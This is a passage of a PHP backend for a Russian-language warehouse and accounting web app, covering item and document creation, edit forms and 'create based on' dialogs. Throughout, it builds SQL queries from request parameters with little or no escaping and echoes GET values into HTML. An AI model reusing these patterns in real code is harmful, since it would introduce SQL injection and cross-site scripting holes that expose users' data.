                                    $arr[] = $kitem.'="'.$last_id.'"';
                                else if ( $kitem == 'parentid' )
                                    $arr[] = $kitem.'="0"';
                                else if ( substr( $kitem, 0, 5 ) == 'temp_' && $kitem != 'temp_documentid' && $kitem != 'temp_calculationid')
                                    $arr[] = substr( $kitem, 5 ).'="'.$item.'"';
                                else if ( $kitem != 'id' && $kitem != 'dt' && $kitem != 'itemid' && $kitem != 'editable' && $kitem != 'measureid' && $kitem != 'specificationid'  
                                        && $kitem != 'srcitemid' && $kitem != 'srcmeasureid' && $kitem != 'srcspecificationid'
                                        && $kitem != 'destitemid' && $kitem != 'destmeasureid' && $kitem != 'destspecificationid'
                                        && $kitem != 'temp_documentid' && $kitem != 'temp_calculationid' && $kitem != 'total' && $kitem != 'totalplanned' && $kitem != 'diff' 
                                        && $kitem != 'op' && $kitem != 'loss_cold_quantity' && $kitem != 'loss_hot_quantity' && $kitem != 'name' ){
                                    if ( isset( $fields['t_'.substr( $tablename, 2 )][$k]['numeric'] ) )
                                        $item = strpos( $item, ',' ) > -1 ? str_replace( ',' , '.', $item ) : $item ;
                                    $arr[] = $kitem.'="'.$item.'"';
                                }
                            }
                            $q = $qhdr.join( ',', $arr );
                            
                            mysql_query( $q ) or die( mysql_error() );
                        }  
                    }
                
                if ( isset( $ms ) && !empty( $ms ) ){
                    foreach( $ms as $k => $v ){                        
                        foreach( $v as $item ){
                            if ( $item > 0 )
                                mysql_query( "INSERT INTO `".addslashes( $fields[$tablename][$k]['db_selectto'] )
."` SET ".addslashes( $fields[$tablename][$k]['select_field'] )."='".addslashes( $item )."', ".addslashes( $fields[$tablename][$k]['to_field'] )."='".addslashes( $last_id )."'");  
                        }
                    }
                }
                    
//ПРОВОДИМ ДОКУМЕНТ
                    if ( $tablename != 's_calculations' && $conduct == 2 ) conduct( $tablename, $last_id );

                    $query = mysql_query( "SELECT * FROM `".addslashes( $tablename )."` WHERE id='".addslashes( $last_id )."' LIMIT 1" );
                    $row = mysql_fetch_assoc( $query );

                    zlog( json_encode( array(
                        'table' => $tablename,
                        'row' => $row 
                    ) ), 1001 ); 

                    //Полюшко-поле, Полюшко, широко поле.
                    foreach( $row as $k => $v ){
                        if ( !empty( $fields[$tablename][$k]['type'] ) )
                        switch ( $fields[$tablename][$k]['type'] ){
                            case 'date': $row[$k] = date( 'd.m.Y', strtotime( $row[$k] ) ); break;
                            case 'datetime': $row[$k] = date( 'd.m.Y H:i:s', strtotime( $row[$k] ) ); break;
                            case 'label': $row[$k] = get_select_val($fields[$tablename][$k]['db_select'], $v ); break;
                            case 'db_select': $row[$k] = get_select_val($fields[$tablename][$k]['db_select'], $v ); break; 
                            case 'db_grid': $row[$k] = get_grid($fields[$tablename][$k]['db_grid'], $v ); break; 
                            case 'checkbox': $row[$k] = ( $row[$k] == 1 ? 'Да' : 'Нет' ); break;
                        }
                        if ( !empty( $fields[$tablename][$k]['after_text'] ) ){
                            $row[$k] .= $fields[$tablename][$k]['after_text'];
                        }
                    }
                    
                    $answer = array();
                    
                    $row['editable'] = 1;
                    
                    if ( substr( $tablename, 2 ) == 'calculations' || substr( $tablename, 0, 7 ) == 'd_cash_' )
                        $answer["row"] = $row;
                    else if ( substr( $tablename, 0, 2 ) == 't_' ){
                        $table = 'd_'.addslashes( substr( $tablename, 2 ) );
                        $row["total"] = round( $row["quantity"] * $row["price"] * $row["multip"], 2 );
                        if ( $tablename == 't_inventory' ){
                            $row["diff"] = round( $row["quantity"] - $row["plannedquantity"], 3 );
                            $row["totalplanned"] = round( $row["plannedquantity"] * $row["price"] * $row["multip"], 3 );
                        }

                        $answer["row"] = $row;
                        $answer["total"] = get_db_select_sum( $fields[$table]['total']['db_select'], $fields[$table]['total']['idfield'], ( int ) $row['documentid'], $fields[$table]['total']['sumfield'], 2 );
                        if ( $tablename == 't_inventory' ){
                            $answer["totalplanned"] = get_db_select_sum( $fields[$table]['totalplanned']['db_select'], $fields[$table]['totalplanned']['idfield'], ( int ) $row['documentid'], $fields[$table]['totalplanned']['sumfield'], 2 );
                            $answer["totaldiff"] = get_db_select_sum( $fields[$table]['totaldiff']['db_select'], $fields[$table]['totaldiff']['idfield'], ( int ) $row['documentid'], $fields[$table]['totaldiff']['sumfield'], 3 );
                        }
                    } else {
                        $row["total"] = get_db_select_sum( $tablename, $fields[$tablename]['total']['idfield'], $last_id, $fields[$tablename]['total']['sumfield'], 2 );
                        if ( $tablename == 'd_inventory' ){
                            $row["totalplanned"] = get_db_select_sum( $fields[$table]['totalplanned']['db_select'], $fields[$table]['totalplanned']['idfield'], $last_id, $fields[$table]['totalplanned']['sumfield'], 2 );
                            $row["totaldiff"] = get_db_select_sum( $fields[$table]['totaldiff']['db_select'], $fields[$table]['totaldiff']['idfield'], $last_id, $fields[$table]['totaldiff']['sumfield'], 3 );
                        }

                        $answer["row"] = $row;
                    }
                    
                    echo json_encode( $answer );
                }
            }
        break;
        //редактирование элемента- ФОРМА
        case 'edit_el':
            $tablename = isset( $_GET['table'] ) ? $_GET['table'] : '';
            $id = isset( $_GET['id'] ) ? $_GET['id'] : '';
            $rowdata = isset( $_POST['rowdata'] ) ? $_POST['rowdata'] : '';
               
            if ( $tablename != '' && $id != '' ) {
                echo '<div class="modal fade" id="dialog_edit-'.$tablename.'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
<div class="modal-dialog" style="width:900px" >
<div class="modal-content">
<div class="modal-header">
    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
    <h4 class="modal-title">Редактирование '.( substr( $tablename, 0, 2 ) == 'd_' ? 'документа ' : 'элемента ' ).$tables[$tablename]['name'].'</h4>
</div>
<div class="modal-body">
<div class="formp"><form class="form-horizontal" id="form_edit-'.$tablename.'" method="post" action="/company/warehouse/warehouse.php?do=edit&table='.$tablename.'&id='.$id.'" novalidate>';

                if ( substr( $tablename, 0, 2 ) == 't_' && $rowdata != '' ){
                    $rowdata = json_decode( $rowdata );
                    if ( is_object( $rowdata ) ) $rowdata = get_object_vars( $rowdata );
                    
                    $rowdata['itemid'] = $rowdata['temp_itemid'];
                    $rowdata['measureid'] = $rowdata['temp_measureid'];
                    $rowdata['srcitemid'] = $rowdata['temp_srcitemid'];
                    $rowdata['srcmeasureid'] = $rowdata['temp_srcmeasureid'];
                    $rowdata['srcspecificationid'] = $rowdata['temp_srcspecificationid'];
                    $rowdata['destitemid'] = $rowdata['temp_destitemid'];
                    $rowdata['destmeasureid'] = $rowdata['temp_destmeasureid'];
                    $rowdata['destspecificationid'] = $rowdata['temp_destspecificationid'];

                    foreach( $rowdata as $k => $v ){
                        if ( substr( $k, 0, 5 ) != 'temp_' ){
                            if ( $fields[$tablename][$k]['in_edit'] ){
                                echo showfieldA( $tablename, $k, $rowdata, $rowdata['id'] );

                                if ( $fields[$tablename][$k]['type'] == 'db_select' && ( $k === 'measureid' || $k === 'itemid' || $k === 'srcitemid' || $k === 'destitemid' ) ){
                                    if ( $k === 'itemid' || $k === 'srcitemid' || $k === 'destitemid' )
                                        echo '<script>
$( "#form_edit-'.$tablename.' input[name=itemid]" ).die( "change" );
$( "#form_edit-'.$tablename.' input[name=itemid]" ).live( "change", function (){ getMeasure( this ); } );
</script>';
                                    else if ( $tablename != 's_calculations' )
                                        echo '<script>
$( "#form_edit-'.$tablename.' input[name='.$k.']" ).die( "change" );
$( "#form_edit-'.$tablename.' input[name='.$k.']" ).live( "change", function (){ getMultip( this ); } );
</script>';
                                }
                                if ( $tablename == 't_calculations' && ( $k === 'loss_cold' || $k === 'loss_hot' || $k === 'quantity' ) ){
                                    echo '<script>
$( "#form_edit-'.$tablename.' input[name='.$k.']" ).die( "change" );
$( "#form_edit-'.$tablename.' input[name='.$k.']" ).live( "change", function (){ calcLoss( this ); } );
</script>';
                                }
                            }
                        }
                    }
                } else {
                    $data = array();
                    $query = mysql_query( "SELECT * FROM `".addslashes( $tablename )."` WHERE id='".$id."' LIMIT 1");
                    $data = mysql_fetch_assoc( $query );

                    if ( isset( $editor[$tablename] ) ){
                        echo form_design( $tablename, $data, $id );
                    } else {
                        foreach( $fields[$tablename] as $k => $v ){
                            if ( $v['in_edit'] ){
                                echo showfieldA( $tablename, $k, $data, $data['id'] );

                                if ( substr( $tablename, 0, 7 ) != 'd_cash_' && $v['type'] == 'db_select' && ( $k === 'measureid' || $k === 'itemid' ) ){
                                    if ( $k === 'itemid' )
                                        echo '<script>
$( "#form_edit-'.$tablename.' input[name=itemid]" ).die( "change" );
$( "#form_edit-'.$tablename.' input[name=itemid]" ).live( "change", function (){ getMeasure( this ); } );
</script>';
                                    else if ( $tablename != 's_calculations' )
                                        echo '<script>
$( "#form_edit-'.$tablename.' input[name='.$k.']" ).die( "change" );
$( "#form_edit-'.$tablename.' input[name='.$k.']" ).live( "change", function (){ getMultip( this ); } );
</script>';
                                }

                            }
                        }
                    }
                }
                
                $createBasedDoc = '';
                if ( substr( $tablename, 0, 2 ) != 't_' ){
                    if ( $table == 's_calculations' || $table == 'd_request' )
                        echo '<input type="hidden" name="conduct" value="0">';
                    else
                        echo '<input type="hidden" name="conduct" value="'.( isConducted($tablename, $id) ? '1' : '0' ).'">';
                    
                    if ( substr( $tablename, 0, 7 ) != 'd_cash_' )
                        echo '<input type="hidden" name="t_'.( substr( $tablename, 2 ) ).'" value="">
<input type="hidden" name="t_'.( substr( $tablename, 2 ) ).'_deleted" value="">';

                    switch ( $tablename ){
                        case 'd_receipt':
                            $createBasedDoc =
'<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">На основании<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_selling\')">Реализация</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_movement\')">Перемещение</a></li>
</ul></div>';
                        break;
                        case 'd_selling':
    //СТРАШНЫЕ ШТУКИ ТИПА ВОЗВРАТОВ И ПРИХОДНЫХ КАССОВЫХ ОРДЕРОВ
                        break;
                        case 'd_posting':
                        break;
                        case 'd_cancellation':
                        break;
                        case 'd_inventory':
                            $createBasedDoc = 
'<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">На основании<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_posting\')">Оприходование</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_cancellation\')">Списание</a></li>
</ul></div>';
                        break;
                        case 'd_movement':
                            $createBasedDoc = 
'<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">На основании<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_cancellation\')">Списание</a></li>
</ul></div>';
                        break;
                        case 'd_production':
                            $createBasedDoc =
'<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">На основании<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_selling\')">Реализация товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_cancellation\')">Списание товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_movement\')">Перемещение товаров</a></li>
</ul></div>';
                        break;
                        case 'd_request':
                            $createBasedDoc =
'<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">На основании<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_receipt\')">Поступление товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_selling\')">Реализация товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_posting\')">Оприходование товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_cancellation\')">Списание товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_movement\')">Перемещение товаров</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_production\')">Выпуск продукции</a></li>
<li><a href="#" onclick="createBasedA(\''.$tablename.'\',\''.$id.'\',\'d_regrading\')">Пересортица товаров</a></li>
</ul></div>';
                        break;
                        case 'd_regrading':
                        break;
                    }
                } else {
                    if ( $tablename == 't_calculations' )
                        echo '<input type="hidden" name="calculationid" value="'.$rowdata['calculationid'].'">';
                    else
                        echo '<input type="hidden" name="documentid" value="'.$rowdata['documentid'].'">';
                }
                
                $actionBtns = '';
                $tipaConductAll='';
                if ( substr( $tablename, 0, 2 ) != 't_' && substr( $tablename, 0, 7 ) != 'd_cash_' )
                    $actionBtns = '<a target="_blank" class="btn btn-default" 
href="/company/warehouse/warehouse.php?do=printDocument&table='.$tablename.'&id='.$id.'&print=1">Печать</a> ';
                
                if ( $tablename == 'd_inventory' ){
                     $tipaConductAll =  '<button type="button" class="btn btn-default" onclick="ZConductInventoy(this, \''.$tablename.'\',\''.$id.'\')">Создать оприходование и списание и провести</button>';
                    $actionBtns .= '<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">Заполнить<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="getRemains(\''.$tablename.'\', 1)">По остаткам</a></li>
<li><a href="#" onclick="getReRemains(\''.$tablename.'\')">Перезаполнить учетные количества</a></li>
</ul></div>';
                }
            
                $conductBtn = '';
                if ( substr( $tablename, 0, 2 ) == 'd_' && $tablename != 'd_inventory' && $tablename != 'd_request' ){
                    if ( isConducted( $tablename, $id ) ){
                        $conductBtn = '<button type="button" class="btn btn-primary" onclick="conductA1(this, \''.$tablename.'\',\''.$id.'\')">Перепровести</button> 
<button type="button" class="btn btn-danger" onclick="cancelConductA(this, \''.$tablename.'\')">Отменить проведение</button>';
                    } else
                        $conductBtn = '<button type="button" class="btn btn-primary" onclick="conductA1(this, \''.$tablename.'\',\''.$id.'\')">Провести</button>';
                }

                echo '<input type="hidden" name="id" value="'.$id.'">'
.( substr( $tablename, 0, 2 ) == 'd_' ? '<input type="hidden" name="modified" value="0">' : '')
.'</form></div></div>
<div class="modal-footer">'
.' <button type="button" class="btn btn-default" data-dismiss="modal">Отмена</button> '
.$actionBtns.' '
.$createBasedDoc.' '
.$conductBtn
.$tipaConductAll
.' <button type="button" class="btn btn-primary" onclick="saveA1(this, \''.$tablename.'\',\''.$id.'\')">Сохранить</button>
</div></div></div></div>';
            }

        break;
        //изменение группы и элемента в базе  - В БАЗУ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        case 'edit':
            $arr = array();
            
            $id = isset( $_GET['id'] ) ? $_GET['id'] : '';
            $tablename = isset( $_GET['table'] ) ? $_GET['table'] : '';
            

            if ( substr( $tablename, 0, 2 ) == 't_' ){
                //ВЕРНУТЬ МАССИВ ПОЛЕЙ
                $arr = $_POST;

                $query = mysql_query( "SHOW COLUMNS FROM `".addslashes( $tablename )."`" );
                while ( $row = mysql_fetch_assoc( $query ) ){
                    $arr[$row['Field']] = isset( $_POST[$row['Field']] ) ? $_POST[$row['Field']] : null;
                }

                foreach( $arr as $k => $v ){
                    if ( !empty( $fields[$tablename][$k]['type'] ) )
                        switch ( $fields[$tablename][$k]['type'] ){
                            case 'label':
                                $arr[$k] = get_select_val( $fields[$tablename][$k]['db_select'], $v );
                            break;
                            case 'db_select':
                                if ( $k == 'documentid' || $k == 'calculationdid' ){
                                    $arr[$k] = $arr[$k];
                                } else {
                                    $arr['temp_'.$k] = $arr[$k];
                                    $arr[$k] = get_select_val( $fields[$tablename][$k]['db_select'], $v );
                                }
                            break; 
                            case 'db_grid':
                                $arr[$k] = get_grid( $fields[$tablename][$k]['db_grid'], $v );
                            break;
                            case 'checkbox':
                                $arr[$k] = ( $arr[$k] == 1 ? 'Да' : 'Нет' );
                            break;
                        }
                    if ( !empty( $fields[$tablename][$k]['after_text'] ) ){
                        $arr[$k] .= $fields[$tablename][$k]['after_text'];
                    }
                }
                
                $row = $arr;
            } else {
                if( !empty( $_POST['idout'] ) )
                    $_POST['idout'] = checkIdout2Edit( $tablename, $id, $_POST['idout'] );

                $conduct = -1;
                $td = array();
                $deleted = array();
                $ms = array();
                foreach ( $_POST as $k => $v ){
                    if ( $k == 'modified' ){
                        
                    } else if ( $fields[$tablename][$k]['type'] == 'date' ){
                        $arr[] = addslashes( $k )."='".date( 'Y-m-d', strtotime( $v ) )."'";
                    } else if ( $fields[$tablename][$k]['type'] == 'datetime' ){
                        $arr[] = addslashes( $k )."='".date( 'Y-m-d H:i:s', strtotime( $v ) )."'";
                    } else if ( $fields[$tablename][$k]['type'] == 'db_grid' ){                        
                        $td = json_decode( $_POST[$k] );
                    } else if( $fields[$tablename][$k]['type'] == 'db_multicheckbox' ){
                        $ms[$k] = $_POST[$k];
                    } else if ( $k == 't_'.( substr( $tablename, 2 ) ).'_deleted' ){
                        if ( $_POST[$k] != '' )
                            $deleted = explode( ';', $_POST[$k] );
                    } else if ( $k == 'conduct' ){
                        $conduct = (int)$v;
                    } else if ( $k != 'editable' )
                        $arr[] = addslashes( $k )."='".addslashes( $v )."'";
                }
                
                if ( $tablename == 's_calculations' && isset( $td ) ){
                    $s = '';
                    foreach( $td as $k => $v ){
                        if ( is_object( $v ) ) $v = get_object_vars( $v );
                        $s .= $v['temp_itemid'].',';
                    }
                    $s = substr( $s, 0, -1 );

                    if ( checkCircles( $_POST['itemid'], $s ) == 0 ){
                        $answer = array();
                        $answer['rescode'] = 1;
                        $answer['resmsg'] = 'Сохранение невозможно, т.к. один или несколько ингредиентов используют выбранное блюдо!';
                        die( json_encode( $answer ) );
                    }
                }

                if ( isset( $deleted ) && !empty( $deleted ) ){
                    $s = '0';
                    foreach( $deleted as $d ){
                        $s .= ','.$d;
                    }
                    mysql_query( 'DELETE FROM t_'.( substr( $tablename, 2 ) ).' WHERE id IN ('.$s.')' ) or die( mysql_error() );
                }

                if ( isset( $td ) && !empty( $td ) ){
                    $ins = 'INSERT INTO t_'.( substr( $tablename, 2 ) ).' SET ';
                    $upd = 'UPDATE t_'.( substr( $tablename, 2 ) ).' SET ';
                    //echo 1;
                    //print_r($td);
                    foreach( $td as $k => $v ){
                        //echo 2;
                        $a = array();
                        $op = 0;
                        $rowid = 0;
                        foreach( $v as $kitem => $item ){
                            if ( $kitem == 'id' )
                                $rowid = ( int ) $item;
                            else if ( $kitem == 'op' )
                                $op = ( int ) $item;
                            else if ( $kitem == 'documentid' || $kitem == 'calculationid' )
                                $a[] = $kitem.'="'.$id.'"';
                            else if ( $kitem == 'parentid' )
                                $a[] = $kitem.'="0"';
                            else if ( substr( $kitem, 0, 5 ) == 'temp_' && $kitem != 'temp_documentid' && $kitem != 'temp_calculationid' )
                                $a[] = substr( $kitem, 5 ).'="'.$item.'"';
                            else if ( $kitem != 'id' && $kitem != 'dt' && $kitem != 'editable' && $kitem != 'itemid' && $kitem != 'measureid' && $kitem != 'specificationid' 
                                    && $kitem != 'srcitemid' && $kitem != 'srcmeasureid' && $kitem != 'srcspecificationid'
                                    && $kitem != 'destitemid' && $kitem != 'destmeasureid' && $kitem != 'destspecificationid'
                                    && $kitem != 'temp_documentid' && $kitem != 'temp_calculationid' && $kitem != 'total' && $kitem != 'totalplanned' && $kitem != 'diff'
                                    && $kitem != 'modified'
                                    && $kitem != 'op' && $kitem != 'loss_cold_quantity' && $kitem != 'loss_hot_quantity' && $kitem != 'name' ){
                                if ( isset( $fields['t_'.substr( $tablename, 2 )][$kitem]['numeric'] ) )
                                    $item = strpos( $item, ',' ) > -1 ? str_replace( ',' , '.', $item ) : $item ;
                                $a[] = $kitem.'="'.$item.'"';
                            }
                        }

                        if ( $op == 1 )//Добавили новое
                            $q = $ins.join( ',', $a );
                        else if ( $op == 2 )//Изменили старое
                            $q = $upd.join( ',', $a ).' WHERE id='.$rowid;
                        //echo $q;
                        //echo "op=".$op.'.';
                        if ( $op > 0 ) mysql_query( $q ) or die( mysql_error() );
                    }  
                }
                
                if ( isset( $ms ) && !empty( $ms ) ){
                    foreach( $ms as $k => $v ){
                        mysql_query("DELETE FROM `".addslashes( $fields[$tablename][$k]['db_selectto'] )."` WHERE ".addslashes( $fields[$tablename][$k]['to_field'] )."='".addslashes( $id )."'");
                        
                        foreach( $v as $item ){
                            if ( $item > 0 )
                                mysql_query( "INSERT INTO `".addslashes( $fields[$tablename][$k]['db_selectto'] )
."` SET ".addslashes( $fields[$tablename][$k]['select_field'] )."='".addslashes( $item )."', ".addslashes( $fields[$tablename][$k]['to_field'] )."='".addslashes( $id )."'");  
                        }
                    }
                }

                mysql_query( "UPDATE `".addslashes( $tablename )."` SET ".join( ',', $arr )." WHERE id='".addslashes( $id )."'" );

                if ( $conduct != 1 ){
                    $t = false;
                    if ( $conduct == 0 ){
                        if ( isConducted( $tablename, $id ) ){
//                        $doctype = 0;
//                        switch ( $tablename ){
//                            case 'd_receipt':       $doctype = 1; break;
//                            case 'd_selling':       $doctype = 2; break;
//                            case 'd_posting':       $doctype = 3; break;
//                            case 'd_cancellation':  $doctype = 4; break;
//                            case 'd_inventory':     $doctype = 5; break;
//                            case 'd_movement':      $doctype = 6; break;
//                        }
//                        cancelConduct( $tablename, 0, $id );
                            $t = conduct( $tablename, $id );
                        }
                    } else if ( $conduct == 2 ){
                        $t = conduct( $tablename, $id );
                    }
                    if ( $t ){
                        $dt1 = strtotime( $_POST['dt'] );
                        $actualDt = strtotime( getActualDt() );

                        if ( $dt1 < $actualDt ) setActualDt ( date( 'Y-m-d H:i:s', strtotime( $_POST['dt'] ) ) );
                    }
                }

                $query = mysql_query( "SELECT * FROM `".addslashes( $tablename )."` WHERE id='".addslashes( $id )."' LIMIT 1" );
                $row = mysql_fetch_assoc( $query );

                zlog( json_encode( array(
                    'table' => $tablename,
                    'row' => $row 
                ) ), 1002 );

                //Полюшко-поле, Полюшко, широко поле.
                foreach( $row as $k => $v ){
                    if ( !empty( $fields[$tablename][$k]['type'] ) && $k != 'documentid' )
                        switch ( $fields[$tablename][$k]['type'] ){
                            case 'date': $row[$k] = date( 'd.m.Y', strtotime( $row[$k] ) ); break;
                            case 'datetime': $row[$k] = date( 'd.m.Y H:i:s', strtotime( $row[$k] ) ); break;
                            case 'label':
                                $row[$k] = get_select_val( $fields[$tablename][$k]['db_select'], $v );
                            break; 
                            case 'db_select':
                                if ( $k != 'documentid' ){
                                    $row['temp_'.$k] = $row[$k];
                                    $row[$k] = get_select_val( $fields[$tablename][$k]['db_select'], $v );
                                }
                            break; 
                            case 'db_grid':
                                $row[$k] = get_grid( $fields[$tablename][$k]['db_grid'], $v );
                            break; 
                            case 'checkbox':
                                $row[$k] = ( $row[$k] == 1 ? 'Да' : 'Нет' );
                            break;
                        }
                    if ( !empty( $fields[$tablename][$k]['after_text'] ) ){
                        $row[$k] .= $fields[$tablename][$k]['after_text'];
                    }
                }
            }
                    
            $answer = array();
            
            $row['editable'] = 1;

            //$answer["row"] = $arr;

            if ( substr( $tablename, 0, 2 ) == 't_' ){
                $table = 'd_'.addslashes( substr( $tablename, 2 ) );
                if ( $tablename == 't_inventory' ){
                    $row["diff"] = round( $row["quantity"] - $row["plannedquantity"], 3 );
                    $row["totalplanned"] = round( $row["plannedquantity"] * $row["price"] * $row["multip"], 3 );
                }
                if ( $tablename == 't_calculations' ){
                    $row['loss_cold_quantity'] = round( $row['quantity'] - $row['quantity'] * $row['loss_cold'] / 100, 3 );
                    $row['loss_hot_quantity'] = round( ( $row['quantity'] - $row['quantity'] * $row['loss_cold'] / 100 ) - $row['quantity'] * $row['loss_hot'] / 100, 3 );
                } else
                    $row["total"] = round( $row["quantity"] * $row["price"] * $row["multip"], 2 );

                $answer["row"] = $row;
                $answer["total"] = get_db_select_sum( $fields[$table]['total']['db_select'], $fields[$table]['total']['idfield'], ( int ) $row['documentid'], $fields[$table]['total']['sumfield'], 2 );
                if ( $tablename == 't_inventory' ){
                    $answer["totalplanned"] = get_db_select_sum( $fields[$table]['totalplanned']['db_select'], $fields[$table]['totalplanned']['idfield'], ( int ) $row['documentid'], $fields[$table]['totalplanned']['sumfield'], 2 );
                    $answer["totaldiff"] = get_db_select_sum( $fields[$table]['totaldiff']['db_select'], $fields[$table]['totaldiff']['idfield'], ( int ) $row['documentid'], $fields[$table]['totaldiff']['sumfield'], 3 );
                }
            } else {
                if ( $tablename != 's_calculations' )
                    $row["total"] = get_db_select_sum( $fields[$tablename]['total']['db_select'], $fields[$tablename]['total']['idfield'], $id, $fields[$tablename]['total']['sumfield'], 2 );
                if ( $tablename == 'd_inventory' ){
                    $row["totalplanned"] = get_db_select_sum( $fields[$tablename]['totalplanned']['db_select'], $fields[$tablename]['totalplanned']['idfield'], $id, $fields[$tablename]['totalplanned']['sumfield'], 2 );
                    $row["totaldiff"] = get_db_select_sum( $fields[$tablename]['totaldiff']['db_select'], $fields[$tablename]['totaldiff']['idfield'], $id, $fields[$tablename]['totaldiff']['sumfield'], 3 );
                }

                $answer["row"] = $row;
            }

            echo json_encode( $answer );
            
//            echo json_encode( $row );
        break;
        //Создание документа на основании
        case 'create_based_doc':
            $basedoc = isset( $_GET['basedoc'] ) ? $_GET['basedoc'] : '';
            $id = isset( $_GET['id'] ) ? $_GET['id'] : 0;
            $newdoc = isset( $_GET['newdoc'] ) ? $_GET['newdoc'] : '';
            
            if ( $basedoc != '' && $newdoc != '' ){
                $result = mysql_query( 'SELECT * FROM '.$basedoc.' WHERE id='.$id.' LIMIT 1' );
                $baseDocRow = mysql_fetch_array( $result );

            echo '<div class="modal fade"  id="dialog_add-'.$newdoc.'"  tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" style="width:900px" >
<div class="modal-content">
<div class="modal-header">
    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
    <h4 class="modal-title">Добавление на основании</h4></div><div class="modal-body">
<div class="formp">
<form class="form-horizontal" role="form" id="form_add-'.$newdoc.'" method="post" action="/company/warehouse/warehouse.php?do=add&table='.$newdoc.'&parentid=0"  novalidate>';      

            if ( isset( $editor[$newdoc] ) ){
                echo form_design( $newdoc, 0, 0 );
            } else {
                foreach( $fields[$newdoc] as $k => $v ){
                    if ( $v['in_edit'] ){
                        if ( $v['type'] == 'db_grid' ){
                            echo '<div class="form-group">
<label class="col-lg-12 control-label" style="text-align: left">Товары:</label>
<div class="col-lg-12">';
                            
                            echo '<div id="toolbar-'.$fields[$newdoc][$k]['db_grid'].'">
<a href="javascript:void(0)" class="btn btn-default" onclick="createA(\''.$fields[$newdoc][$k]['db_grid'].'\',\''.$id.'\')">Добавить элемент</a>
<a href"javascript:void(0)" class="btn btn-default" onclick="editA(\''.$fields[$newdoc][$k]['db_grid'].'\')">Изменить</a>
<a href="javascript:void(0)" class="btn btn-default" onclick="deleteA(\''.$fields[$newdoc][$k]['db_grid'].'\')">Удалить</a>
</div>';

                            echo "<div class='highlight'><table id='table-".$fields[$newdoc][$k]['db_grid']."'></table>
<script>
\$('#table-".$fields[$newdoc][$k]['db_grid']."').myTreeView({
    url:'/company/warehouse/warehouse.php?do=get&table=".$fields[$newdoc][$k]['db_grid']."&idfield=".$fields[$newdoc][$k]['idfield']."&".$fields[$newdoc][$k]['idfield']."=".$id."&basedoc=t_".substr( $basedoc, 2 )."&nolimit=topgear', 
    headers: [";
                            foreach( $fields[$fields[$newdoc][$k]['db_grid']] as $field1 => $v1 ){
                                if ( $v1['in_grid'] ){
                                    echo "{name:'".$field1."',title:'".$v1['title']."'".( !empty($v1['width'] ) ? ",width:'".$v1['width']."'" : '' )."},";
                                } 
                            }
                            echo "],
    tree: false,
    numeration: true,
    dblclick : function (){ editA( '".$fields[$newdoc][$k]['db_grid']."' ); }
});
</script></div>";
                            echo '</div></div>';
                        } else if ( $v['type'] == 'label' )                            
                            echo '<div class="form-group">
<label class="col-lg-4 control-label">Автор документа</label>
<div class="col-lg-8">
<input class="form-control" readonly value="'.( isset( $_SESSION['employeeid'] ) ? getfiobyid( $_SESSION['employeeid'] ) : $_SESSION["user"] ).'">
<input name="'.$k.'" type="hidden" value="'.( isset( $_SESSION['employeeid'] ) ? $_SESSION['employeeid'] : $_SESSION["userid"] ).'">
</div></div>';
                        else
                            echo showfieldA( $newdoc, $k, $baseDocRow, $baseDocRow['id'] );
                    }
                }
            }

            echo '<input type="hidden" name="saved" value="0">
                <input type="hidden" name="conduct" value="0">
                <input type="hidden" name="t_'.( substr( $newdoc, 2 ) ).'" value="">';
            
            $actionBtns = '';
            if ( $newdoc == 'd_inventory' ){
                $actionBtns = '<div class="btn-group dropup">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">Заполнить<span class="caret"></span></button>
<ul class="dropdown-menu" role="menu">
<li><a href="#" onclick="getRemains(\''.$newdoc.'\', 1)">По остаткам</a></li>
<li><a href="#" onclick="getRemains(\''.$newdoc.'\', 0)">Учетные количества</a></li>
</ul></div>';
            }

            $conductBtn = '';
            //if ( (substr( $tablename, 0, 2 ) == 'd_') && ($tablename != 'd_inventory') )
            if ( (substr( $newdoc, 0, 2 ) == 'd_') && ($newdoc != 'd_inventory') )
